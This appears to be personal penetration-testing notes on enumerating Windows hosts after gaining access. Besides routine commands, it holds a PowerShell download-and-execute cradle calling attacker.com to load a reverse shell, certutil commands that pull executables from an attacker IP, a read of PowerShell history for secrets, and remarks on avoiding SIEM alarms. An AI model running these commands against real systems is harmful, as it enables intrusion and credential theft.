# enumeration of windows environments

This page serves as a reference to be used during operations. Included items are:

- checklists/skeletons of common enumerations loops
- prepared statements, ready for copy paste
- legacy reference notes, useful for writing and for when other methods have been exhausted

## default enumeration activity - noisy, lab use only

1. `systeminfo`
	1. we care about the most recent patch and build numbers
	2. in particular note the KB hotfix number
3. `powershell -c 'dir env:'`
	1. userinfo 
	2. env vars
4. Execute the following in order, parse the ouput carefully.
	1. `PowerUp.ps1`
	2. `SharpUp.exe`
	3. `WinPeasANY.exe`
5. manual enumeration
	1. focus on human activity
	2. scripts, notes, custom applications
	3. passwords written where they shoud not be


## powershell

> initial enumerations
```powershell
get-localuser		# lists users
get-localgroup		# lists groups
get-childitem -recurse -Depth 1		# nice way to get "tree" output
get-acl FILENAME    # shows owner+other stuff on directory/object pointed at
Get-Service | Where-Object -Property Status -eq Running # running services	 
```

> serving files
```
all cmd commands should work
also `wget` is a common alias which creates the `Invoke-WebRequest` powershell equivalent
```

> find command
```powershell
get-childitem -force -recurse -path C:\ -errorACtion SilentlyContinue -include *SEARCH_TERM*
# https://devblogs.microsoft.com/scripting/use-windows-powershell-to-search-for-files/ 
```

> grep equivalent; this will search entire filesystem; albeit with a lot of terminal noise
```powershell
Get-ChildItem C:\* -recurse | Select-String -pattern SEARCH_TERM
```

## using common scripts

### Execution without touching disk

1. host the `script.ps1` 
2. edit the `script.ps1` file to call w.e. function you want by placing the function call, including arguments, at the end of this file. This is often the reverse shell.
3. use `IEX(new-object net.webClient).downloadString('http://attacker.com/script.ps1')` 


### Execution with touching disk 

> `PowerUp.ps1` is used as an example

```powershell
-ep bypass
import-module powerup.ps1 # or w.e u named it
invoke-allchecks          # this is a method defined in powerup.ps1
```


## legacy reference  - first attempts at learning enumeration

Flailing about. This section holds notes created when first studying Windows Enumeration. It is disorganized and ineffective for operations. Leaving it here to demonstrate growth and as reference for writing. Not likely to be referenced during campaigns. 

bullet points

- `C:/windows/tasks`     -   is a common (ALL) READ/WRITE directory
- winPEAS exists
- seatbelt exists
- `find` command exists, does it ? YES
- `cacls FILENAME`  access control lists; deprecated but sometimes has info



### notable files

> etc hosts
```
c:\Windows\System32\Drivers\etc\hosts
```

> powershell history
```
C:\Users\%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
```


### the classics
```cmd.exe
systeminfo

wmic qfe get Caption, Description
; installed updates, hotfixes etc

net start
; started and installed services

wmic product get name,version,vendor
; installed apps

whoami /all  # (includes, /privs and /groups)
net user, net user /domain
net localgroup, net localgroup  GROUPNAME

net account, net accounts /domain  
; Get password policy info, among other stuff

```
> note that most of these are alarmed by the SIEM, especially those which enumerate the domain. powershell equivalents might be the way to go?


### network
> ports in use; all, binary(name of exe), no-resolve numbers, PID
```
netstat /?
netstat -abno
# -b is the valuable flag here, resolves binary name
```

> network interfaces, is this multi-homed?
```
ipconfig
```

> discover peers via pingsweep
```
PINGSWEEP SCRIPT, or manually
ping -a the results
```

> discovery peers, alternative to pingsweep, MAY BE ALARMED
```
arp -a
```

> host file, may reveal information
```
c:\Windows\System32\Drivers\etc\hosts
```


### cmd

> when enumerating through RCE; particularly useful for pulling/serving with certutil
```
cmd.exe /C 																			; executes a command in cmd.exe, similar to powershell -c
cmd.exe /C certutil -urlcache -split -f http://<MY_IP>/NAME_FILE.exe OUTFILE.exe 	; example of serving
```


> basic enumerations; drop these commands when you initially land
```sh
powershell> dir env: 								; list env vars for current user; excellent info here
whoami /all  (or /priv)
systeminfo
type C:\Users\USER_NAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

> serving files 
```sh
certutil -urlcache -split -f http://<MY_IP>/NAME_FILE.exe OUTFILE.exe 				; may not needs -split
```




